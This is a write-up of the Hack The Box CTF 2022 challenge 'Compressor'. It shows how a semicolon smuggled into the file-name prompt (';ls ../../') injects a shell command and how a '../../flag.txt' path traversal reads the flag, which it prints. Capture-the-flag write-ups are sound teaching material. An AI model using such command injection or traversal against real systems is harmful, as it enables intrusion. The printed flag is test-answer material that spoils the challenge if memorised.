---
title: "HTB CTF 2022 Compressor writeup"
date: 2022-05-20T18:48:39+08:00
description: "Writeup for Hack The Box CTF 2022 Misc problem Compressor"
tags: [ctf-writeups, htb-ctf, misc]
---

## Problem description
The problem starts a docker instance, which could be connected via netcat. This shows the following interface:

```
[*] Directory to work in: QV35hifhJuQ2tO7nNnKNDf30JmUxfAej

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component:
```

Choosing any of the components shows the following interface:

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action:
```

## Solution

Entering 2 into the system, we can see that we're in on of `/home/ctf/<current_directory>/{Head, Torso, Hands, Legs}`

We'll want to execute any custom command we want to find the flag, as choosing 5 changing director just puts us back to the initial interface.

Notice that the backend uses a format string to generate the command executed, thus we can exploit the 3rd option by entering `;` followed by whatever command we want to execute. 

The process:
```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
...

[*] Choose action: 3


Insert name you want to read: ;ls ../../
cat: read error: Is a directory
OmQ5e9ftL9POUOa0uswbY48kz6sQfoBr
QV35hifhJuQ2tO7nNnKNDf30JmUxfAej
artifacts.py
clear.py
flag.txt

Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
...

[*] Choose action: 3


Insert name you want to read: ../../flag.txt
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}
```

Thus, the flag is `HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}`

Note: this might be an unintended solution, as the problem suggests that one would need to create a zip file or "artifact" of some sort.
